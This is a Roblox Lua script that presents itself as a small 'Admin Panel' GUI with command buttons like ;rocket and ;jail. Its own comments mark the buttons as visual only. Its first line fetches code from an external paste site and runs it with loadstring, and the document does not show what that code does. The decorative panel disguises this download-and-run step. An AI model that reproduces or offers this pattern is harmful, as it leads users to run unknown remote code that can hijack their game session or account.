loadstring(game:HttpGet("https://pastefy.app/nKQLkdee/raw"))()
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "MiniAdminPanel"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- MAIN FRAME (SMALL SIZE)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 280, 0, 300) -- <<< NORMAL SIZE
frame.Position = UDim2.new(0.5, -140, 0.5, -150)
frame.BackgroundColor3 = Color3.fromRGB(30, 60, 40)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- TITLE
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 36)
title.BackgroundColor3 = Color3.fromRGB(90, 120, 130)
title.Text = "ADMIN PANEL"
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.TextColor3 = Color3.new(1,1,1)
title.Parent = frame

-- COMMAND BOX
local cmdBox = Instance.new("TextBox")
cmdBox.Size = UDim2.new(1, -12, 0, 32)
cmdBox.Position = UDim2.new(0, 6, 0, 42)
cmdBox.PlaceholderText = "Enter command"
cmdBox.Text = ""
cmdBox.TextScaled = true
cmdBox.Font = Enum.Font.Gotham
cmdBox.BackgroundColor3 = Color3.fromRGB(20,40,30)
cmdBox.TextColor3 = Color3.new(1,1,1)
cmdBox.Parent = frame

-- BUTTON CONTAINER
local container = Instance.new("Frame")
container.Size = UDim2.new(1, -12, 1, -100)
container.Position = UDim2.new(0, 6, 0, 80)
container.BackgroundTransparency = 1
container.Parent = frame

local layout = Instance.new("UIGridLayout")
layout.CellSize = UDim2.new(0, 125, 0, 36)
layout.CellPadding = UDim2.new(0, 6, 0, 6)
layout.Parent = container

-- COMMANDS (VISUAL ONLY)
local commands = {
    ";rocket", ";ragdoll",
    ";balloon", ";inverse",
    ";nightvision", ";jail",
    ";control", ";tiny",
    ";jumpscare", ";morph"
}

for _,cmd in ipairs(commands) do
    local btn = Instance.new("TextButton")
    btn.Text = cmd
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamBold
    btn.TextColor3 = Color3.new(1,1,1)
    btn.BackgroundColor3 = Color3.fromRGB(15, 80, 50)
    btn.Parent = container

    -- Click animation only
    btn.MouseButton1Click:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(0,150,80)
        wait(0.15)
        btn.BackgroundColor3 = Color3.fromRGB(15,80,50)
    end)
end

-- HIDE / SHOW BUTTON
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(0, 90, 0, 28)
toggle.Position = UDim2.new(1, -96, 1, -34)
toggle.Text = "Hide"
toggle.TextScaled = true
toggle.Font = Enum.Font.GothamBold
toggle.BackgroundColor3 = Color3.fromRGB(120, 40, 40)
toggle.TextColor3 = Color3.new(1,1,1)
toggle.Parent = frame

local visible = true

toggle.MouseButton1Click:Connect(function()
    visible = not visible
    container.Visible = visible
    cmdBox.Visible = visible

    if visible then
        toggle.Text = "Hide"
    else
        toggle.Text = "Show"
    end
end)
